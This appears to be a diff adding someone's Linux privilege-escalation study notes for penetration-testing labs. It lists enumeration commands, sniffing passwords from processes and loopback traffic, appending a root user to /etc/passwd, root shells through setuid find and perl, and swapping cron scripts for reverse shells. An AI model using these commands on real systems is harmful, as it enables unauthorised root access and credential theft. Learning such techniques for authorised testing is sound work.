@@ -1,0 +1,144 @@
+ ** Linux PrivEsc**
+ 
+to enumerate all users:
+
+cat /etc/passwd
+hostname
+
+enumerating OS:
+
+cat /etc/isuue
+cat /etc/os-release
+uname -a 
+
+
+enumerating running process or services:
+
+ps aux
+
+Enumerating network:
+
+ip -a , ifconfig
+routel, route 
+netstat
+ss -anp 
+
+enumerating firewall rules:
+ 
+ cat /etc/iptables/(rule file)
+ 
+enumerating scheduled tasks:
+
+ls -lah  /etc/cron*
+crontab -l  (schedule tasks for the current user)
+
+enumerating applications isntalled:
+ 
+dpkg -l
+
+find writable files on the target system:
+
+unix
+
+enumerating unmounted/mounted drives:
+
+cat /etc/fstab
+lsblk
+
+
+enumerating drivers and kernel modules:
+
+lsmod
+/sbin/modinfo <module name>
+ 
+ 
+ searching for suid marked binaries:
+ 
+ find / -perm -u=s -type f 2>/dev/null
+ 
+Automated Enumeration:
+
+unix-privesc-check
+this tool can be used and is preinstalled in linux distribuitions
+ 
+check for environment variables:
+env
+
+try to find credentials
+
+list sudoers capabilities:
+sudo -l
+
+Harvesting Active Processes for Credentials:
+watch -n 1 "ps -aux | grep pass"
+
+Using tcpdump to Perform Password Sniffing:
+sudo tcpdump -i lo -A | grep "pass"
+
+
+Abusing Cronjobs;
+
+grep “CRON” /var/log/syslog
+
+replace the running scripts or edit the scripts with a rev shell one liner
+
+Abusing Password Authentication:
+
+if we can write into /etc/passwd/ we can abuse this
+
+we can add a superuser by first generating its hash and afterwards just adding the whole user to the /etc/passwd
+
+openssl passwd w00t (this will generate a password hash for the w00t txt) 
+
+echo 'root3:lpI/FWQ4TYKik:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+
+This will add the new user onto the machine
+
+
+
+
+Abusing SetUid Binaries and capabilities;
+
+in our case the find utility is misconfigured and has the setuid flag meaning we can search for any well known file, after which we can instruct the find command to perform any action through the -exec parameter
+we will be executing a bash shell 
+
+
+find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+
+this will give us a bash shell with a root user
+
+
+
+
+
+Manually Enumerating Capabilities:
+
+/usr/sbin/getcap -r / 2>/dev/null
+
+setuid must be enabled
+
+
+go to gtfobins and search for these capabilities to exploit
+
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+this can be used in our case to get a rev shell as root
+
+
+
+
+
+Abusing Sudo;
+
+Inspecting current user's sudo permissions:
+
+sudo -l
+
+
+
+browse gtfobins to abuse these permissions
+
+Kernel exploits;
+
+enumerate the operating system and use searchsploit for finding a local priv esc exploit
+https://github.com/bcoles/kernel-exploits.git
